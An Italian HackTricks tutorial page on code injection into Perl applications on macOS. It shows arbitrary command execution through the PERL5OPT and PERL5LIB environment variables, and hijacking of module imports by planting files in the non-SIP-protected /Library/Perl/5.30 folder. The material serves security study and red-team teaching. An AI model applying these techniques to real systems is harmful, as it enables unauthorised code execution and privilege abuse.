# Iniezione di Applicazioni Perl su macOS

<details>

<summary><strong>Impara l'hacking su AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**Gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>

## Attraverso le variabili d'ambiente `PERL5OPT` e `PERL5LIB`

Utilizzando la variabile d'ambiente PERL5OPT è possibile far eseguire a perl comandi arbitrari.\
Per esempio, crea questo script:

{% code title="test.pl" %}
```perl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
{% endcode %}

Ora **esporta la variabile di ambiente** ed esegui lo script **perl**:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Un'altra opzione è creare un modulo Perl (ad esempio `/tmp/pmod.pm`):

{% code title="/tmp/pmod.pm" %}
```perl
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
{% endcode %}

E poi utilizzare le variabili di ambiente:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## Attraverso le dipendenze

È possibile elencare l'ordine delle cartelle delle dipendenze di Perl in esecuzione:
```bash
perl -e 'print join("\n", @INC)'
```
Che restituirà qualcosa del genere:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Alcune delle cartelle restituite non esistono nemmeno, tuttavia, **`/Library/Perl/5.30`** esiste, non è protetta da SIP ed è posizionata prima delle cartelle protette da SIP. Pertanto, qualcuno potrebbe abusare di quella cartella per aggiungere dipendenze di script in modo che uno script Perl ad alto privilegio le carichi.

{% hint style="warning" %}
Tuttavia, nota che **devi essere root per scrivere in quella cartella** e oggigiorno otterrai questo **prompt TCC**:
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>

Ad esempio, se uno script sta importando **`use File::Basename;`** sarebbe possibile creare `/Library/Perl/5.30/File/Basename.pm` per eseguire codice arbitrario.

## References

* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

<details>

<summary><strong>Impara l'hacking AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di Github.

</details>
